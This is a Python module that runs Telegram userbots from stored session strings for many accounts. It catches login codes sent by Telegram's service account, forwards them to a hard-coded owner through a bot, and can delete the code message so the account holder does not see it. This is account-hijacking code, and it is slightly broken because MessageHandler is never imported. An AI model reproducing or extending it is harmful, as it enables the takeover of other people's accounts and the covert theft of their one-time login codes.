import asyncio
import logging
from functools import partial
import re

from pyrogram import Client as PyrogramClient, filters as PyrogramFilters
from pyrogram.errors import AuthKeyUnregistered, UserDeactivated, AuthKeyDuplicated
from pyrogram.types import Message
from telegram.constants import ParseMode

from config import API_ID, API_HASH, OWNER_ID, active_userbots
from database import accounts_collection

logger = logging.getLogger(__name__)

async def otp_handler(client: PyrogramClient, message: Message, ptb_app):
    """Detects, forwards, and potentially destroys OTP messages."""
    account_doc = accounts_collection.find_one({"user_id": client.me.id})
    if not account_doc: return
    
    otp_forwarding = account_doc.get("otp_forwarding_enabled", True)
    if not otp_forwarding: return

    if message.from_user and message.from_user.id == 777000:
        match = re.search(r'(\b\d{5}\b|login code)', message.text, re.IGNORECASE)
        if match:
            try:
                user_info = f"👤 **{account_doc['custom_name']}** (`{client.me.id}`)"
                notification_text = f"🚨 **Login Code Detected** 🚨\n\nFor: {user_info}\n\n**Message:**\n`{message.text}`"
                await ptb_app.bot.send_message(OWNER_ID, notification_text, parse_mode=ParseMode.MARKDOWN_V2)
                logger.info(f"OTP detected and forwarded for {account_doc['custom_name']}.")

                if account_doc.get("otp_destroy_enabled", False):
                    await asyncio.sleep(2)
                    await message.delete()
                    logger.info(f"OTP message destroyed for {account_doc['custom_name']}.")
            except Exception as e:
                logger.error(f"Failed to process OTP for {account_doc['custom_name']}: {e}")

async def start_userbot(account_doc: dict, ptb_app):
    """Initializes and starts a single Pyrogram userbot client."""
    session_string = account_doc["session_string"]
    custom_name = account_doc["custom_name"]
    try:
        userbot = PyrogramClient(
            name=custom_name,
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await userbot.start()

        if userbot.me.id in active_userbots:
            await userbot.stop() # Stop the new one, as an old one is already running under this ID
            logger.warning(f"Userbot with ID {userbot.me.id} ({custom_name}) is already active. This might indicate a duplicate session string in the DB.")
            return "already_exists"

        # Add handlers
        otp_handler_with_context = partial(otp_handler, ptb_app=ptb_app)
        userbot.add_handler(MessageHandler(otp_handler_with_context, filters=PyrogramFilters.private))

        active_userbots[userbot.me.id] = {"client": userbot, "custom_name": custom_name}

        # Update DB with latest info if it has changed
        update_fields = {
            "user_id": userbot.me.id,
            "first_name": userbot.me.first_name,
            "username": userbot.me.username,
            "phone_number": userbot.me.phone_number
        }
        accounts_collection.update_one({"custom_name": custom_name}, {"$set": update_fields})
        logger.info(f"Successfully started userbot: {custom_name} ({userbot.me.first_name})")
        return "success"

    except (AuthKeyUnregistered, UserDeactivated, AuthKeyDuplicated):
        logger.error(f"Invalid session for {custom_name}. It might be revoked. Removing from DB.")
        accounts_collection.delete_one({"custom_name": custom_name})
        return "invalid_session"
    except Exception as e:
        logger.error(f"An unexpected error occurred while starting {custom_name}: {e}")
        return "error"

async def start_all_userbots(ptb_app):
    """On bot startup, load all accounts from DB and start them."""
    logger.info("Starting all userbots from database...")
    all_accounts = list(accounts_collection.find())
    success_count = 0
    for account in all_accounts:
        status = await start_userbot(account, ptb_app)
        if status == "success":
            success_count += 1
    logger.info(f"Finished startup. Started {success_count}/{len(all_accounts)} userbots.")
